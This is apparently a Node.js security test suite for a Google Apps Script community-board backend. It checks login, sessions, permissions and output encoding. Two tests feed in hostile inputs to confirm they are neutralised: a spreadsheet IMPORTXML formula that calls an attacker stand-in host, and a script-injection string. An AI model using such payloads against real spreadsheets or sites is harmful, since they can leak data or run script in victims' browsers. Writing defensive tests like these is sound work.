const { test } = require('node:test');
const assert = require('node:assert/strict');
const vm = require('node:vm');
const fs = require('node:fs');
const { randomUUID, createHash } = require('node:crypto');
const source = fs.readFileSync(require('node:path').join(__dirname,'../apps-script/Code.gs'),'utf8');

function server() {
  const db = {}, cache = new Map(), props = {SPREADSHEET_ID:'test', GOOGLE_CLIENT_ID:'client', GOOGLE_CLIENT_SECRET:'secret',SITE_ORIGIN:'https://example.github.io',ADMIN_EMAILS:'admin@example.org'};
  const profile = {sub:'google-user-a',email:'a@example.org',email_verified:true,name:'회원 A'};
  let fetches=0;
  function sheet(name) {
    const data = db[name] ||= [];
    return {
      getLastRow:()=>data.length, appendRow:r=>data.push(r),setFrozenRows:()=>{},deleteRow:r=>data.splice(r-1,1),
      getRange(row,col,n=1,m=1) { return {getValues:()=>Array.from({length:n},(_,i)=>Array.from({length:m},(_,j)=>data[row-1+i]?.[col-1+j]??'')),setNumberFormat(){return this;},setValues(rows){rows.forEach((r,i)=>{data[row-1+i]||=[];r.forEach((v,j)=>data[row-1+i][col-1+j]=v);});return this;}}; }
    };
  }
  const context = vm.createContext({Date,JSON,Number,String,Error,RegExp,
    Utilities:{getUuid:randomUUID,DigestAlgorithm:{SHA_256:'sha256'},Charset:{UTF_8:'utf8'},computeDigest:(_,v)=>[...createHash('sha256').update(v).digest()]},
    PropertiesService:{getScriptProperties:()=>({getProperty:k=>props[k]})},
    CacheService:{getScriptCache:()=>({put:(k,v)=>cache.set(k,v),get:k=>cache.get(k),remove:k=>cache.delete(k)})},
    SpreadsheetApp:{openById:()=>({getSheetByName:name=>db[name]?sheet(name):null,insertSheet:sheet})},
    LockService:{getScriptLock:()=>({tryLock:()=>true,hasLock:()=>true,releaseLock:()=>{}})},
    HtmlService:{XFrameOptionsMode:{ALLOWALL:1},createHtmlOutput:html=>({html,setXFrameOptionsMode(){return this;}})},
    UrlFetchApp:{fetch:(url,options)=>{fetches++;if(url.endsWith('/token')){assert.equal(options.payload.client_secret,'secret');assert.equal(options.payload.redirect_uri,props.SITE_ORIGIN);return{getResponseCode:()=>200,getContentText:()=>JSON.stringify({access_token:'google-server-token'})};}assert.equal(options.headers.Authorization,'Bearer google-server-token');return{getResponseCode:()=>200,getContentText:()=>JSON.stringify(profile)};}}
  });
  vm.runInContext(source,context);context.setup();
  const call = (action,data={},session) => context.dispatch_({action,data,session});
  const login = (sub='google-user-a',email='a@example.org') => {profile.sub=sub;profile.email=email;return call('login',{code:'one-use-google-code',challenge:call('challenge').challenge});};
  const approve = id => {const m=context.find_('Members',id);m.status='approved';context.save_('Members',m);};
  return {context,call,login,approve,db,props,profile,get fetches(){return fetches;}};
}
const denied = (fn,code)=>assert.throws(fn,e=>e.cicCode===code);
const draft = () => ({title:'봉사 활동 기록',body:'오늘 함께한 활동',category:'activity',mutationId:randomUUID()});

test('anonymous and pending users cannot read private posts or comments',()=>{
  const s=server();denied(()=>s.call('listPosts'),'AUTH');const a=s.login();assert.equal(a.member.status,'pending');denied(()=>s.call('listPosts',{},a.session),'PENDING');denied(()=>s.call('getPost',{id:'x'},a.session),'PENDING');
});
test('identity is obtained from Google and never from the submitted email',()=>{
  const s=server();const c=s.call('challenge').challenge;const a=s.call('login',{code:'code',challenge:c,email:'admin@example.org',role:'admin'});assert.equal(a.member.role,'member');assert.equal(s.fetches,2);
});
test('login challenge is one-use and invalid challenge causes no Google request',()=>{
  const s=server();denied(()=>s.call('login',{code:'code',challenge:'made-up'}),'AUTH');assert.equal(s.fetches,0);const challenge=s.call('challenge').challenge;s.call('login',{code:'code',challenge});denied(()=>s.call('login',{code:'code',challenge}),'AUTH');
});
test('Google accounts without verified email are rejected',()=>{
  const s=server();s.profile.email_verified=false;denied(()=>s.login(),'AUTH');assert.equal(s.context.rows_('Members').length,0);
});
test('session is stored only as a hash and expired sessions fail closed',()=>{
  const s=server(),a=s.login(),row=s.context.rows_('Sessions')[0];assert.notEqual(row.id,a.session);assert.equal(JSON.stringify(s.db).includes(a.session),false);row.expiresAt=0;s.context.save_('Sessions',row);denied(()=>s.call('me',{},a.session),'AUTH');
});
test('members cannot approve themselves or publish notices',()=>{
  const s=server(),a=s.login();s.approve(a.member.id);denied(()=>s.call('setMemberStatus',{id:a.member.id,status:'approved'},a.session),'FORBIDDEN');denied(()=>s.call('createPost',{...draft(),category:'notice'},a.session),'FORBIDDEN');
});
test('post retries are idempotent, private payloads do not expose emails',()=>{
  const s=server(),a=s.login();s.approve(a.member.id);const d=draft(),p=s.call('createPost',d,a.session).post;assert.equal(s.call('createPost',d,a.session).post.id,p.id);const list=s.call('listPosts',{},a.session);assert.equal(list.total,1);assert.equal(JSON.stringify(list).includes('a@example.org'),false);assert.equal(list.posts[0].body,undefined);
});
test('other members cannot change or delete someone else’s posts',()=>{
  const s=server(),a=s.login();s.approve(a.member.id);const p=s.call('createPost',draft(),a.session).post;const b=s.login('google-user-b','b@example.org');s.approve(b.member.id);denied(()=>s.call('deletePost',{id:p.id,version:1},b.session),'FORBIDDEN');denied(()=>s.call('updatePost',{id:p.id,version:1,...draft()},b.session),'FORBIDDEN');
});
test('stale edits are rejected and author can update their own post',()=>{
  const s=server(),a=s.login();s.approve(a.member.id);const p=s.call('createPost',draft(),a.session).post;const edited=s.call('updatePost',{...draft(),id:p.id,version:1,title:'수정한 제목'},a.session).post;assert.equal(edited.version,2);denied(()=>s.call('deletePost',{id:p.id,version:1},a.session),'CONFLICT');
});
test('comments enforce author rights and deleted parent hides all comments',()=>{
  const s=server(),a=s.login();s.approve(a.member.id);const p=s.call('createPost',draft(),a.session).post;const d={postId:p.id,body:'댓글입니다',mutationId:randomUUID()};const c=s.call('createComment',d,a.session).comment;assert.equal(s.call('createComment',d,a.session).comment.id,c.id);const b=s.login('b','b@example.org');s.approve(b.member.id);denied(()=>s.call('updateComment',{id:c.id,version:1,body:'남의 댓글 수정'},b.session),'FORBIDDEN');s.call('deletePost',{id:p.id,version:1},a.session);denied(()=>s.call('getPost',{id:p.id},a.session),'NOT_FOUND');denied(()=>s.call('createComment',{...d,mutationId:randomUUID()},a.session),'NOT_FOUND');
});
test('server rejects oversized and blank content and stores formulas as JSON text',()=>{
  const s=server(),a=s.login();s.approve(a.member.id);denied(()=>s.call('createPost',{...draft(),title:' '},a.session),'INVALID');denied(()=>s.call('createPost',{...draft(),body:'a'.repeat(10001)},a.session),'INVALID');s.call('createPost',{...draft(),body:'=IMPORTXML("https://attacker.invalid","x")'},a.session);assert.equal(s.db.Posts[1][1][0],'{');
});
test('admin approval and immediate blocking revoke access',()=>{
  const s=server(),a=s.login(),admin=s.login('admin-sub','admin@example.org');assert.equal(admin.member.status,'approved');s.call('setMemberStatus',{id:a.member.id,status:'approved'},admin.session);assert.equal(s.call('me',{},a.session).member.status,'approved');s.call('setMemberStatus',{id:a.member.id,status:'blocked'},admin.session);denied(()=>s.call('listPosts',{},a.session),'AUTH');
});
test('removing admin from server properties revokes privileges immediately',()=>{
  const s=server(),a=s.login('admin-sub','admin@example.org');s.props.ADMIN_EMAILS='another@example.org';denied(()=>s.call('listMembers',{},a.session),'FORBIDDEN');
});
test('HTML transport uses exact target origin and safely encodes user text',()=>{
  const s=server(),a=s.login();s.approve(a.member.id);const p=s.call('createPost',{...draft(),body:'</script><script>alert(1)</script>'},a.session).post;const payload={requestId:'a'.repeat(64),origin:s.props.SITE_ORIGIN,action:'getPost',session:a.session,data:{id:p.id}};const out=s.context.doPost({parameter:{payload:JSON.stringify(payload)}}).html;assert.ok(out.includes('https://example.github.io'));assert.equal((out.match(/<script>/g)||[]).length,1);assert.ok(out.includes('\\u003c/script>'));
});
